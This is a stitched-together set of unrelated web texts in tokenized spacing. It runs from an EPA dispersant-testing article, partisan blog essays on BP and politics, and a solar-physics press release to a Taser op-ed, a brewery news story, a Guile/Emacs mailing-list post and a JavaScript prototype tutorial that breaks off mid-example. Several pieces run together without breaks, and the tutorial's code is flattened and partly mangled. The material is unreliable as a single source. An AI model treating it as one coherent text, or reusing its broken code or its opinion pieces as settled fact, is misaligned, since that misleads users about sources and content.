It now appears that the EPA failed to require adequate controls for dispersant toxicity testing , despite the fact that the agency set very explicit criteria for how such chemicals should be tested .
This follows the agency 's call for BP to use less deadly dispersants ( pdf ) with toxicities below a certain threshold when , in toxicology , it 's smaller figures that indicate a concentration that is more dangerous .
When testing a given chemical 's toxic impact , using the same methods on the same chemical — a so - called reference toxicant — should give consistent results no matter who carries out the tests .
That way the toxicity of various products can be rated against each other , and against a certain benchmark .
In addition to setting such a benchmark , the EPA also sets rules for how the chemical test solutions should be made , the concentrations required , and the organisms to be tested ( in the case of dispersants , a fish , Menidia beryllina , and a shrimp , Mysidopsis bahia ) , among other specifications .
The reference toxicant provides scientific assurance that the tests were carried out in the manner intended , and helps to legitimize data that is , after all , provided by the makers of the chemicals themselves .
In the case of the dispersants pre-approved for use by the EPA in the event of an oil spill , that reference toxicant is a surfactant called dodecyl sodium sulfate , a chemical that helps liquids spread out .
Assuming all tests were carried out in a similar fashion , they should deliver similar results on the toxicity of SDS .
But toxicologist Carys Mitchelmore of the University of Maryland says that industry - provided testing values on the toxicity of SDS relative to various dispersants on the market vary " up to 300 - fold . "
The cause , she says : " They could have had bad water , bad animals , bad reference toxicant or they could have just run it badly . "
And NOKOMIS 3 - F4 ( purported by EPA 's list to be the least toxic dispersant ) did n't even use SDS as its reference toxicant , relying instead on copper sulfate .
" That one 's the real outlier , " Mitchelmore says .
As she testified to the U.S. Senate last week , " If you do not have consistent [ lethal concentration data ] for your reference toxicant then you cannot assume any of the other tests are reporting accurate data . "
That means the EPA does not know the relative toxicity of various dispersants available on the market and pre-approved for use , and never accurately knew their toxicity prior to the ongoing disaster in the Gulf of Mexico .
So far , more than five million liters of dispersants have been used there .
Which begs the question : Did anybody at EPA check the industry 's dispersant homework ?
" What does concern me is that there clearly is no quality control .
How do they make the decision that these things are approved then ? "
Mitchelmore asks .
" How could they have accepted this data ? "
The agency is currently carrying out its own toxicity tests on the various dispersant options , an effort that should take no more than six weeks and could be done in as few as two .
In the meantime , the impacts of the dispersed oil from BP's Macondo well will provide answers .
" We 're going to be filling in some of those data gaps , " Mitchelmore says , with data from the real world .

No , the BP oil volcano in the Gulf of Mexico is not your fault , despite what many pundits will tell you .
Back in the 1960s when the environmental movement got going , major US corporations responsible for much of the nation ’s pollution decided to fight it by paying for television advertising that urged individuals not to litter , thus implying that pollution is produced by anarchic individuals rather than by organized businesses .
It was a crock then and it is a crock now .
You did not demand that BP consistently cut safety corners more than any other petroleum company , thus resulting in the Deepwater Horizon calamity , which could end up costing the economy of the Gulf of Mexico literally hundreds of billions of dollars this year .
How much the Gulf oil catastrophe is not your fault can more clearly be seen if we consider the ways in which a BP refinery in Indiana is threatening the Great Lakes with excess pollution .
The BP refinery received permission from the Indiana legislature to increase its ammonia and silt ( infested with toxic heavy metals ) output into the Lakes .
The increased pollution was part of an expansion of the refinery to allow it to process Canadian tar sands .
In addition , BP has illegally spewed extra benzene into the lakes ( benzene is a known cause of leukemia ) and has also repeatedly broken the law with regard to air pollution standards .
You did not ask BP to dump extra benzene illegally into Lake Michigan ( the lakes are connected ) .
You did not agitate in Indianapolis to permit the refinery to expand to handle tar sand , which is all by itself an ecological catastrophe .
You did not demand that more ammonia and toxic metals be dumped into the lakes .
None of these crimes against nature was your individual responsibility .
Rather , the Indiana legislature passed these laws because of ‘ legislative capture . ’
That phenomenon occurs when an industry that is supposed to be regulated by a legislature instead pays so much for political campaigns that it captures the members and proves able to write the legislation affecting its interests .
Legislative capture explains almost everything that is wrong with America today , from the wars to the difficulty in expanding health care , and from inaction on climate change to the high price of prescription drugs .
Legislative capture is not your fault .
In fact , it is mostly the fault of Ronald Reagan , who so lowered taxes on the rich that he allowed them to capture almost all the country ’s increased wealth since the 1980s , depriving ordinary Americans of any real increase in the standard of living .
Since our filthy rich quadrupled their wealth in recent decades but most of you do n’t have 4 times as much money in the bank as you used to , you are competing less and less well with the rich for access to and influence with your elected representatives .
This year a man worth $ 9 billion died and passed it on to his children without paying any estate tax at all , thanks to the Republican Party .
This situation is creating a permanent aristocracy of the sort that in the eighteenth century ruled the 13 colonies in the East and the northern territories of the Spanish Empire in the West , all of which now have congealed into the United States .
One of the points of the American Revolution from the point of view of Thomas Jefferson was to make the country safe for middling , yeoman farmers and to prevent the distant colonial aristocracy from taxing us without representation .
Our new business aristocracy , whether Big Oil or Big Banking , taxes us indirectly by legislative capture , by arranging for bought - and - paid - for politicians to subsidize their industries with public tax monies .
There is nothing wrong with being wealthy , and often the wealthy have made key contributions to society .
But let us face it .
Business classes are interested in short - term profit and seldom think in terms of long - term cost - benefit for society .
Having a dynamic business class in a society can be a plus if its focus on short - term gain for the company can be offset by other powerful forces in society – labor unions , NGOs , intellectuals and others .
But when the business classes get so they own nearly half the privately held wealth , they can overwhelm everyone else and take society in self - destructive directions – as happened with the Iraq War , the economic collapse in September of 2008 and with the oil rig collapse in April 2010 .
And that is not your fault .
Now , part of what the pundits are saying when they say the Gulf oil gusher is your fault is that you like to drive your car inexpensively to work , and so you are part of a consumer market that motivates BP to drill .
But it is grossly unfair to blame you , the worker , for the difficulty of getting to work by much more efficient rail or for allegedly rejecting electric vehicles powered by .e.g. wind farms .
The US government gives and has for decades given massive hidden subsidies to the petroleum industry that make gasoline seem far less expensive than than it is , and auto , cement and oil corporations successfully lobbied for taxpayer subsidies for highway systems rather than for rail and public transport .
You did not ask them to do that .
Joe Blumenauer notes :
‘ Oil companies receive special deductions lowering their effective tax rate to about 11 percent , compared to 18 percent for non-oil industries .
This has cost an estimated $ 200 billion since 1968 and , with soaring industry profits in recent years , is growing at an ever - increasing rate . ‘
The cost of licenses for offshore drilling have been mysteriously slashed by the Department of the Interior , a way of transferring your money to the oil companies and of actually promoting offshore drilling , with all its potential to harm you environmentally and economically .
Do you remember lobbying the Mines and Minerals Service for that one ?
Even the wars you are paying for in the Perso - Arabian Gulf and in Central Asia , as well as the aid given Israel and Egypt , amounting altogether to over $ 100 billion a year , must be seen as a subsidy to big oil .
And then , the cost of water , soil and air pollution is not figured into the price of a gallon of gasoline .
It is charged to the taxpayer in various ways .
And , global warming is also not figured into the cost of gasoline .
In fact , the various deep subsidies that you are involuntarily giving Big Oil are being used in part to buy a propaganda campaign to convince you that climate change has been exaggerated and is nothing to worry about .
Ironic , ai n’t it ?
But that is not your fault , either .
People keep saying that wind power is ‘ just about ’ competitive with oil and gas .
But in fact if the true cost of oil and gas were properly calculated , and all the hidden subsidies were removed , wind would be revealed to be much cheaper than these other power sources are .
Even solar might make a good showing in that case .
( Do n’t bother complaining to me about the limits of wind turbines and solar cells ; they have those limits because not enough research and development money has been thrown at them by the government and by government - engineered incentives to private business .
A reader complained that the investment had not worked with regard to fusion but that is silly .
Wind and solar are proven but infant technologies and Germany has already shown that government support makes a big difference here . )
The subsidies for petroleum are unlikely to be lifted .
This outcome is not because you will lobby congress and the senate to keep supporting big oil with your tax dollars .
It is because of legislative capture .
Too many elected representatives secretly run on the Big Oil Party ticket .
( And no , it is not true that President Obama is more guilty of that than were his opponents ) .
It would help if the US Supreme Court did not recognize corporations as persons and did not confuse political campaign money with free speech , and if it would allow Germany ’s practice of making campaign ads free .
Then our elected representatives would not have to spend all their time raising money for television commercials from corporations in return for legislative quid pro quos .
But the Court is appointed by the politicians who are victims of legislative capture , and it therefore represents the interests of Big Business .
I do n’t know how to turn this thing around .
I do n’t know how to get free campaign commercials , or less money in politics , or stop legislative capture or halt the enthronement of the New American Business Aristocracy , with its all too frequent focus on short - term profit over long - term public welfare .
I do n’t know how to stop offshore drilling or wean us all off petroleum - fueled automobiles ( I know that such a weaning would in any case take decades– but we have n’t even begun ) .
Me , I ride my bike into work 9 months of the year .
I do know that many congressional Democrats see the current tragedy as a once - in - a- century opportunity to reformulate energy policy away from petroleum , and that they will need an outpouring of public support and of public donations to pull that off .
If you do n’t support them in this push to begin getting away from hydrocarbons , then whatever follows– will be your fault .
Musical sounds created by longitudinal vibrations within the Sun 's atmosphere , have been recorded and accurately studied for the first time by experts at the University of Sheffield , shedding light on the Sun 's magnetic atmosphere .
Using state - of - the - art mathematical theory combined with satellite observations , a team of solar physicists from the University have captured the music on tape and revealed the harmonious sounds are caused by the movement of giant magnetic loops in the solar corona -- the outermost , mysterious , and least understood layer of the Sun 's atmosphere .
Most importantly , the team studied how this sound is decaying , giving an unprecedented insight into the physics of the solar corona .
High - resolution images taken by a number of satellites show that the solar corona is filled with large banana - shaped magnetic structures known as coronal loops .
It is thought that these giant magnetic loops , some of them over a few 100,000 km long , play a fundamental role in governing the physics of the corona and are responsible for huge atmospheric explosions that occur in the atmosphere , known as solar flares .
These giant coronal loops have also been observed to undergo periodic ( oscillatory ) motion , which can be thought of as someone plucking a guitar string ( transversal oscillations ) or blowing the wind - pipe instrument ( longitudinal oscillations ) .
With the length and thickness of the string fixed , the pitch of the note is determined by the tension of the string and the tone is made up of the harmonics of the modes of oscillation .
In this sense , the solar atmosphere is constantly pervaded by the music of the coronal loops .
The coronal music also provides scientists with a unique and unprecedented tool to study the magnetic solar atmosphere , as the motion of these loops is determined by their local surroundings .
This technique is known as solar magneto - seismology and is very similar to the seismology methods used by geologists studying earthquakes .
Studying this magnetic solar atmosphere will help the team , which is headed - up by Professor Robertus von Fáy - Siebenbürgen and includes postgraduate student Richard Morton and postdoctoral research associate Dr Youra Taroyan , all from the Dept of Applied Mathematics , make further breakthroughs into understanding one of the key and central unresolved problems of modern astrophysics , i.e. the heating of solar and tellar coronal plasmas , and reveal the underlying physical processes :
Are there millions of localised magnetic explosions releasing the energy necessary to maintain the corona at millions of degrees or is the physics related to the numerous waves propagating from the internal regions of the Sun toward its outer regions , reaching even space around the Earth 's atmosphere .
The discovery was presented by the University experts to an audience of MPs both from the House of Commons and the House of Lords at the House of Commons Marquee , as well as and senior scientists representing prestigious institutions such as the Royal Society , after being selected by the Parliamentary and Scientific Committee .
The next step for the team will be to develop cutting edge numerical modelling that will be able to give further insight into the sub-resolution properties of coronal loops , i.e. on spatial scales that are not even observable with the latest high - resolution satellites available to scientist .
This is the second solar related breakthrough made by experts at the University .
The way in which the solar corona is heated to temperatures of over a million degrees had , until recently , remained a long - standing puzzle of solar and space physics , as this region of the sun is even further away from the centre of energy production than the underlying solar surface .
However Professor von Fáy - Siebenbürgen and his team last month solved this enigma and revealed that Transition Region Quakes -- described by the experts as ' mega - tsunamis ' -- power the lower base of the solar corona .
The news comes as the University of Sheffield launches a unique venture entitled Project Sunshine , led by the Faculty of Science .
The Project aims to unite scientists across the traditional boundaries in both the pure and applied sciences to harness the power of the sun and tackle the biggest challenge facing the world today : meeting the increasing food and energy needs of the world´s population in the context of an uncertain climate and global environment change .
It is hoped that Project Sunshine will change the way scientists think and work and become the inspiration for a new generation of scientists focused on solving the world´s problems .
Professor Robertus von Fáy - Siebenbürgen from the University of Sheffield 's Department of Applied Mathematics and Head of SP2RC , said : " The results of our latest coronal research , presented in the Parliament at Westminster , allow us to gain a fundamentally new insight into the fascinating but at the same time very mysterious solar atmosphere .
I 'm most proud to have such talented young scientists within my research group and department .
The invitation by SET for Britain and our collaborative research efforts clearly demonstrate our international leadership position in the field of solar physics . "

Again this year the star attraction at the Portland celebration of National Train Day was the SP 4449 , which used to pull the Southern Pacific Coast Daylight coaches from LA to Portland .
It ’s one of three locomotives owned by the city of Portland ( visit the Oregon Rail Heritage Foundation website for more information about the other locomotives and learn about the foundation ’s efforts to build a permanent home for these historical locomotives and other rolling stock ) .
Also , like last year , the weather was gorgeous .
Heather abandoned me this weekend , so I was traveling solo , armed only with my iPhone for taking photos .
So unfortunately I did not get any decent ones of the displays and activities inside Union Station .
However , there was plenty to see outside .
Like tigers mauling children !
And trains and crowds .
And did I mention it was a beautiful day ?
Remove all the items as quickly as possible , by pointing , clicking , dragging , dropping and hitting the spacebar , as you are told ...
I live in Oregon , and I work late and I get up late , and so I was late coming to the Taser party this morning .
Throw in my Tuesday chat and trying to do some relatively quick blogging , and I 've just now seen the video .
Which made me want to write about a thousand words .
Which made me wonder if I might find a shortcut .
Which made me hope that Craig Calcaterra had already written something , because Craig and I tend to see the world through the same spectacles .
He did n't let me down .
After acknowledging that of course fans should n't run around on the field , and of course there 's a danger to the players and the umpires when it happens , Craig says almost exactly what I was thinking ...
I do not agree that the guy at the Phillies game should have been subdued with a Taser .
It was too much force , in my view , and was disproportionate to the threat presented .
And make no mistake : a Taser is designed to be use to combat threats , not merely to help subdue drunks or trespassers .
Indeed , the very company who makes the Taser calls it a product that " protects life . "
One that is designed to " incapacitate dangerous , combative , or high - risk subjects who pose a risk to law enforcement / correctional officers , innocent citizens , or themselves . "
Can anyone point to a moment where the kid threatened or even came near anyone on the field ?
Any point where he appeared to be " dangerous , " or " combative ? "
Any point where he appeared to " pose a risk to law enforcement officers ? " -- snip --
I know that people worry about the safety of players .
I do too .
I also worry , however , about what happens when the government uses its most serious power : the power to exert force over citizens .
There are over 2000 baseball games a year .
In any given year there are very , very few incidents of fans running on the field .
Of those , incidents in which the fans get anywhere near a player before being subdued are even rarer .
If more attention were paid to in - stadium security , the incidents would be even rarer than that .
Now think about what we risk when we tell police officers that it 's perfectly acceptable to use force without heed to the actual threat -- as opposed to potential threat -- posed by the suspect .
Because make no mistake , that 's what anyone who uses the " but we have no idea what could have happened " argument to support the police officer is really saying .
Personally I find that unsettling .
Me too .
Actually , I find it worse than unsettling .
I find this disturbing and revolting .
The Tasering , yes .
But even more , the defense of the Tasering .
What happens next time ?
Will fans be cheering ?
I do n't have a great imagination , but it 's easy for me to imagine the chants ...
Tase - him !
Tase - him !
Punish idiots who run on the field .
Punish them extra if they 're drunk .
If they 've got a knife and have murderous intent , throw them in a dungeon and forget about them for a while .
But a baseball field is a stage for athletes .
It 's not meant to showcase the sharpshooting talents of a cop who 's tired of chasing a foolish , but probably harmless , teenager .
When we applaud that , we take one step closer to barbarism .

The tall tales about Barack Obama keep getting taller everyday on Fox News .
Tonight on The O’Reilly Factor guest Monica Crowley who claimed that , “ Obama is taking a vacation every five minutes … Bush took two vacations a year in August and at Christmastime that was it . ”
Here is the video courtesy of Media Matters :

Monica Crowley claimed that , “ He actually shoehorning the job of the presidency into his busy schedule of going on vacation , listening to the comic stylings of George Lopez , swaying to Paul McCartney , playing golf , shooting hoops , taking smokes .
What else is this guy doing ?
Is he ever working ? ” O’Reilly pointed out that people said the same the thing about Bush , and asked what the difference is between Bush and Obama , and Crowley told a boldfaced lie , “ Obama is taking a vacation every five minutes .
He ’s blowing off steam almost every day ….he is got partying going on .
He ’s at the Nationals game .
Bush took two vacations a year in August and at Christmastime that was it . ”
Crowley is lying .
Bush spent 1,020 days of his presidency on vacation .
To put this into context , John F. Kennedy spent fewer days in office , 1000 , than George W. Bush spent on vacation .
Bush spent 487 days at Camp David , 490 days at his Crawford ranch , and 43 days in Kennebunkport .
George W. Bush spent 69 days in Crawford during his first year in office .
In contrast , according to FactCheck.org , Obama spent all , or part of , 26 days of his first year in office on vacation .
This was less than all three previous Republican presidents , Ronald Reagan , George H.W. Bush , and George W. Bush , but more than the two previous Democratic presidents , Jimmy Carter and Bill Clinton .
In Fox News revisionist GOP history , George W. Bush was a hard worker who was always at his desk doing the work of the American people , while Obama is just another party animal Democrat , who does n’t take his job seriously .
Crowley ’s applied a strange definition of vacation to Obama .
Since when is shooting hoops , playing golf , or even having a smoke , a vacation ?
I do believe that Lopez and McCartney came to the White House .
Obama did not go see them .
No president has ever been as lazy as the man who spent 1/3 of his time in the White House on vacation , George W. Bush , and it is laughable that Crowley would even try to float such a ridiculous lie .
Our doom shall come by fire rather than by ice : last month was the hottest April on record , ever .
The average global temperature was a balmy 58.1 degrees , 1.37 degrees above average .
But ... but what about Dr. Drudge 's scientific reassurances ? [ NOAA ]
A Birmingham brewmaster and a real estate agent are converting a century - old building that has been empty since the mid-1980s into Avondale 's first brewery .
Craig Shaw , who has been brewing his own beers for 15 years , and Coby Lake of Keller Williams Realtors have had contractors gut a 4,000 - square - foot building at 201 41st St. South that is being transformed into Avondale Brewing Co .
The brewery is on track to open by late December or early January , said Lake , whose friend courted him for two years before convincing him to partner in the new venture .
Avondale Brewing will be the second brewery to open in Birmingham this year .
Jason Malone , who opened Good People Brewing Co. in a Five Points South basement two years ago , earlier this year began renovating a 25,000 - square - foot former warehouse at 114 14th St. South into its new production facility .
Shaw , a 33 - year - old home improvements contractor , is a member of Free the Hops , a beer advocacy group that successfully lobbied to get higher alcohol craft beers to Alabama .
He credits its success with making his longtime dreams of opening a brewery possible .
" We would n't even be at this point if not for Free the Hops , " said Shaw , a member of Birmingham Brewmasters who recently completed an apprenticeship under brewmaster James Ray of Montgomery Brewing Co .
Neighborhood buzz
Lake , 30 , said they have received an outpouring of support since beginning conversion of the historic 41st Street South building into a brewery .
A Facebook page , Avondale Brewing Co. , set up by his wife , Cindy , on Monday had 535 members as of Wednesday afternoon .
Lake 's brother Hunter is also involved in the brewery .
Both of them are partners in Turnkey Homes , which buys , rehabs and sells distressed properties .
Lake said they targeted the 41st Street South property , located a block from his Keller Williams office , because he sees Avondale as a community on the verge of revitalization .
" It 's been amazing the reaction we 've received , " Lake said .
" I had people look us up on Facebook and drive by the site .
Some even offered to help with construction for free .
It shows the passion for home - brewed beer and this neighborhood . "
A nod to history
Lake and Shaw did research on the building and found it dates back to 1885 and has been a bank and a fire station .
It most recently was Long Branch Saloon , a popular gathering place before closing in the late 1980s , Lake said .
Shaw and Lake would n't say how much they have invested , but acknowledged it is a substantial amount .
After buying the building , they are putting it through a major restoration that includes a new floor , roof replacement , new plumbing and wiring .
Shaw said he is buying specially - designed equipment from Germany capable of making 17 barrels of beer at a time .
A barrel is 31 gallons , or two kegs .
" Our goal for the first year is to produce 757 barrels , " Shaw said .
" This system will be capable of producing 10,000 barrels a year so we have plenty of room to grow . "
One of the beers Shaw plans to brew is called Long Branch Lager , a German - style beer named in tribute to the building 's past as a saloon .
Shaw also is going to make Avondale Pale Ale , a darker , more potent beer .
Merillee Challis , who owns the nearby Bottle Tree Cafe at 3719 Third Ave .
South , has also asked Shaw to brew a special beer he calls Bottle Tree IPA , which she will sell at her restaurant .
" If I am going to drink a beer , it 's India Pale Ale , " said Challis , who lives a block from the planned brewery .
" I see Avondale Brewery as huge for Avondale .
It can be an anchor as we slowly revitalize 41st Street . "
Outdated laws
Shaw said he is in talks with other local pubs and distributors about brewing beer for them as well .
Though the partners are confident Avondale Brewery will be a success , they said brewers are hampered by Alabama 's outdated laws and red tape that stymie the industry statewide .
Free The Hops is pushing the Brewery Modernization Act , which Shaw says got strong support but failed to make it to a full vote of the Alabama legislature after lawmakers got bogged down in bingo legislation .
Jason Malone , owner of Good People Brewery , said laws more fair to brewers and brew pubs would help take the industry to the next level in Alabama .
His brewery is expected to open in its new location in two weeks , and Malone said there is strong movement for local beers in Birmingham .
" I 'm excited about where the market is headed in Alabama as people get more tuned into how much better craft beer is , " Malone said .
" We 've come a long way and I think this trend is here to stay . "
Shaw said it is unfair that beer brewers can't operate pubs at the same location , while wineries can make and sell their product in the same building .
" Alabama law will not allow us to even charge $ 5 for a tour followed by free beer tastings like they can at wineries , " Shaw said .
" Why are we treated differently ? "
If state lawmakers pass the Beer Modernization
Act next year , Lake said it will open opportunities for Avondale Brewery to hire more employees , generate more tax revenue for Birmingham and open a pub , which they hope to call Long Branch Pub .

On Fox News yesterday , Shepard Smith unloaded on BP CEO Tony Heyward who called the Gulf Oil spill a small leak .
In a commentary Smith said to Heyward , “ Our water is now polluted , our coast is now soiled … many of our people are out of a job , and 11 hard working men are dead from the explosion on the rig that carried your company ’s name …. at least act like you care . ”
Here is the video :

Smith pointed out that Tony Heyward has refused to appear on his show , and that the BP CEO has called the leak a small spill , and called the lawsuits against BP frivolous .
Smith said , “ Mr. Heyward , your company is responsible for what may become the worst ecological disaster in American history , and you speak of it in these terms ?
Billions upon billions of dollars in damage already and you cast us aside as litigious , and act as if what ’s happening in the Gulf is no big deal , relatively speaking .
Mr. Heyward , that Gulf is a source of life for millions upon millions of people and plants and other creatures on this earth .
Jobs are lost .
Beaches and birds are tarred .
Fisheries are closed .
Tourists are canceling .
Economies are threatened , and people from Florida to Texas are concerned for their very livelihoods , and you speak of comparative volume . ”
He continued , “ Mr. Heyward , British Petroleum has caused the proud people of the Gulf region great pain .
If you think you statements on this subject are helping your company ’s cause , you are wrong , and if you think the people of the gulf region and the rest of America will take lying down without a fight a poorly handled aftermath of what your company has done to our gulf and our people , you are horribly mistaken .
Our water is now polluted .
Our coast is now soiled .
Our fish and our turtles and our shrimp and our oysters are now harmed .
Many of our people are now out of a job , and 11 hard working men are dead from the explosion on the rig that carried your company ’s name .
Remember that , Mr. Heyward ?
We do .
On your watch , these are extremely difficult times for us litigious Americans .
At least act like you care . ”
It should be noted that Shep is from Mississippi , so he feels passionately about part his home region being destroyed by corporate greed and possibly criminal neglect .
The problem is that BP could care less .
This spill and the clean up , along with the 11 wrongful death lawsuits that they will likely settle out of court , is the cost of doing business .
Whatever they will pay for the cleanup is nothing compared to their profits .
This is why we not only need to up the liability damages cap , but I think Congress should consider removing it .
Yes , I can hear the howls about frivolous lawsuits already , but the adjective frivolous is a very subjective term .
If I lost my livelihood due to corporate malfeasance , I would not think that my lawsuit was frivolous .
I do n’t have much hope for regulating a solution because corporate America has become entwined with the political process through campaign contributions .
Remember that today ’s regulations will be tomorrow ’s lobbying campaign during an election year .
The only thing that corporate America understands is the bottom line .
This is where they must be made to hurt .
The United States needs to make it cost prohibitive for corporate giants to engage in behavior like BP’s .
They to make safety a smart business move , because only then will these criminals learn .
Right now , their crime pays , so we must make sure that in the future , crime does not pay .

Perhaps the most bizarre video you will see all day .
I do n't understand it either .

guile and emacs and elisp , oh my !
From : Andy Wingo Subject : guile and emacs and elisp , oh my !
Date : Wed , 14 Apr 2010 22:18:22 +0200 User-agent : Gnus / 5.13 ( Gnus v5.13 ) Emacs /23.0.92 ( gnu/linux )
Greetings , all !
My name is Andy , and together with Ludovic Courtès I co-maintain Guile .
I meant to put off writing this note until some months in the future , but as people seem to be interested in the topic , now is as good a time as any .
The topic ?
Emacs and Guile .
( Cue cheering and derisions ! )
I 'll be telling some history here , from the perspective of one who was n't there , but I believe I have the essentials right .
Emacs and Guile have a long and lovely history , longer in fact than Guile 's existence itself .
Hacking Emacs is the core of GNU -- as you know , Emacs is alive , it 's fungible , it 's free .
The GNU system grew out of Emacs and the hack - experience that it represents .
( I have a friend who regularly chides me when I have to reboot and shut down my Emacs -- it 's like I 'm killing a friend , he says ! )
But when it was decided that GNU should be like a Unix , it was a fall from grace , in a sense .
The system no longer had the Emacs nature .
Time passed , and people looked to see how to spread the Emacs nature from Emacs itself to the rest of the programs in the GNU system .
One possibility would be to extract elisp from emacs and use it as an extension language .
But given that the language would have to be extracted anyway , the thought was to use a more modern Lisp dialect , Scheme .
Thus Guile was born , as the GNU extension language .
( Its birth coincided unfortunately with the so - called " Tcl wars " , but Guile was not made because of Tcl .
Guile was made out of a need that existed outside the polemic .
For example , Neil Jerram -- recently retired Guile maintainer , may he hack in peace -- mentioned to me once that he had contacted Richard quite early on , before the " Tcl wars " , discussing the need for a GNU extension language , as Elisp was to Emacs . )
But I digress !
Tom Lord was the one to make the initial Guile , derived from SCM as you know , and though his time with Guile was too short , we are privileged to have traces of his code in Guile , and his ethereal presence here on this list .
Since then , about 15 years ago now , Guile has had many maintainers .
It was stabilized , and documented , and extended , and hacked , and fixed , but eventually we realized that Guile 's interpreter -- which traversed trees of expressions to produce its effects and values -- was just too slow .
We needed to do some pre-computation on the source ; we needed to compile it to something .
Given that the U is for ubiquitous ( * not * Unique , all you salt - n - pepa fans ) , we could n't do native compilation , not directly anyway -- we needed something portable .
So , with the help of a few hackers , I updated some work that Keisuke Nishida did on writing a VM and associated compiler for Guile , and that 's what we 're going to release hopefully next month as Guile 2.0 .
We 've been trying hard to maintain backwards compatibility for Guile , and we 've done well , I think .
The move from interpreted to compiled code has all of the eval - when pitfalls that you all know , but most extensions just compile fine with 2.0 , and practically all correct Scheme code -- a number of errors were not caught with 1.8 and before -- practically all of that code runs fine without modification .
If you really want the whole story , I 'd advise you to see my presentation at November 's GNU Hackers Meeting in Sweden , which can be viewed or downloaded here :
http://wingolog.org/archives/2010/04/02/recent-developments-in-guile
Hi !
Still with me ?
Cool :)
I 've said all of this to give some credibility to what I 'm going to say now .
Guile can implement Emacs Lisp better than Emacs can .
We can compile Emacs Lisp to Guile 's VM , and make C shims to present a suitably compatible C interface to the rest of Emacs ' C primitives .
No one will notice !
Except that after a switch , Emacs would be faster , more powerful , and have the ability to access all of Guile 's facilities -- the Scheme language , other languages implemented for Guile ( Javascript , Lua , ... ) , a proper ffi , dynamically loadable libraries , a module system , the numeric tower ( rationals , bignums , etc ) , Guile 's existing libraries , delimited continuations (! ) , fast bytevector access , native threads , etc .
On a language level , I am convinced that not only can Guile implement Emacs Lisp , but it can provide a coherent story for tight interaction between e.g. minor modes in Javascript and Scheme and Elisp , etc .
More details will come later , though feel free to bring up specific points .
There have been some suggestions on the list that " Guile people want to rewrite Emacs in Scheme " .
Though Scheme does have some facilities to offer , personally I do not believe in rewriting software .
I 've failed enough times , thank - you - very - much -- and if we could retrofit a compiler into Guile in two years via correctness - preserving transformations , surely we can replace the implementation of Elisp without causing problems .
My goal is to make it the obvious decision for the Emacs maintainers to say , " yes , let 's switch to Guile 's implementation of elisp , because it will make Emacs better and have no drawbacks " .
We 're not there yet -- and that 's why I wanted to put off this mail -- but we 'll get there .
I guess that 's all I have to say , for now -- my bandwidth is not with Emacs right now , as there are enough things to take care of in Guile itself .
But , I 'll be responding to this thread , and lurking on the list , so do get in contact if you have a concern .
In the meantime , happy hacking !

The word on the street is that if Republicans gain control of the House , Rep. Darrell Issa ( R - Calif . ) will hire dozens of lawyers and investigators to use the congressional committee he would chair to pursue a partisan vendetta against President Obama .
What does it tell us about the Republican Party that Issa ’s projected path to power is to imitate the tactics of Richard Nixon in the 1950s , to pursue the practices of partisanship and personal destruction that most voters loathe about politics today ?

JavaScript ’s prototype object generates confusion wherever it goes .
Seasoned JavaScript professionals , even authors frequently exhibit a limited understanding of the concept .
I believe a lot of the trouble stems from our earliest encounters with prototypes , which almost always relate to new , constructor and the very misleading prototype property attached to functions .
In fact prototype is a remarkably simple concept .
To understand it better , we just need to forget what we ‘ learned ’ about constructor prototypes and start again from first principles .
What is a prototype ?
A prototype is an object from which other objects inherit properties
Can any object be a prototype ?
Yes .
Which objects have prototypes ?
Every object has a prototype by default .
Since prototypes are themselves objects , every prototype has a prototype too .
( There is only one exception , the default object prototype at the top of every prototype chain .
More on prototype chains later )
OK back up , what is an object again ?
An object in JavaScript is any unordered collection of key - value pairs .
If it ’s not a primitive ( undefined , null , boolean , number or string ) it ’s an object .
You said every object has a prototype .
But when I write ( {} ) . prototype I get undefined .
Are you crazy ?
Forget everything you learned about the prototype property – it ’s probably the biggest source of confusion about prototypes .
The true prototype of an object is held by the internal [ [ Prototype ] ] property .
ECMA 5 introduces the standard accessor Object.getPrototypeOf( object ) which to - date is implemented in Firefox , Safari , Chrome and IE9 .
In addition all browsers except IE support the non-standard accessor __proto__ .
Failing that we can ask the object ’s constructor for its prototype property .
var a = {} ; Object.getPrototypeOf(a ) ; //[object Object ] a.__proto__ ; //[object Object ] // all browsers //( but only if constructor .
prototype has not been replaced and fails with Object.create ) a.constructor.prototype ; //[object Object ]
Ok fine , but false is a primitive , so why does false .
__proto__ return a value ?
When a primitive is asked for it ’s prototype it will be coerced to an object .
// false.__proto__ === Boolean ( false ) .__proto__ ; //true
I want to use prototypes for inheritance .
What do I do now ?
It rarely makes sense to set a prototype for one instance and only one instance , since it would be equally efficient just to add properties directly to the instance itself .
I suppose if we have created a one off object which we would like to share the functionality of an established object , such as Array , we might do something like this ( in __proto__ supporting browsers ) .
var a = {} ; a.__proto__ = Array.prototype ; a.length ; //0
But the real power of prototype is seen when multiple instances share a common prototype .
Properties of the prototype object are defined once but inherited by all instances which reference it .
The implications for performance and maintenance are obvious and significant .
So is this where constructors come in ?
Yes .
Constructors provide a convenient cross - browser mechanism for assigning a common prototype on instance creation .
Just before you give an example I need to know what this constructor .
prototype property is all about ?
OK .
Firstly JavaScript makes no distinction between constructors and other functions , so every function gets a prototype property ( built - in function excepted ) .
Conversely , anything that is not a function does not have such a property .
// function will never be a constructor but it has a prototype property anyway ( new Function ( ) ) .
prototype ; //[ object Object ] //function intended to be a constructor has a prototype too var A = function ( name ) { this .
name = name ; } A.prototype ; //[object Object ] // Math is not a function so no prototype property Math.
prototype ; //null
So now the definition : A function ’s prototype property is the object that will be assigned as the prototype to all instances created when this function is used as a constructor .
It ’s important to understand that a function ’s prototype property has nothing to do with it ’s actual prototype .
//( example fails in IE ) var A = function ( name ) { this .
name = name ; } A.prototype == A.__proto__ ; // false A.__proto__ == Function.prototype ; //true -
A's prototype is set to its constructor 's prototype property
Example please ?
You ’ve probably seen and used this a hundred times but here it is once again , maybe now with added perspective .
//Constructor . < em > this </em > is returned as new object and its internal [ [ prototype ] ] property will be set to the constructor 's default prototype property var Circle = function ( radius ) { this .radius = radius ; // next line is implicit , added for illustration only // this.__proto__ = Circle.prototype ; } //augment Circle 's default prototype property thereby augmenting the prototype of each generated instance Circle.prototype.area = function ( ) { return Math .
PI * this.radius*this.radius ; } //create two instances of a circle and make each leverage the common prototype var a = new Circle ( 3 ) , b = new Circle ( 4 ) ; a.area ( ) .
to Fixed ( 2 ) ; //28.27 b.area( ) .
to Fixed ( 2 ) ; //50.27
That ’s great .
And if I change the constructor ’s prototype , even existing instances will have access to the latest version right ?
Well ….not exactly .
If I modify the existing prototype ’s property then this is true , because a .__proto__ is a reference to the object defined by A.prototype at the time it was created .
var A = function ( name ) { this .
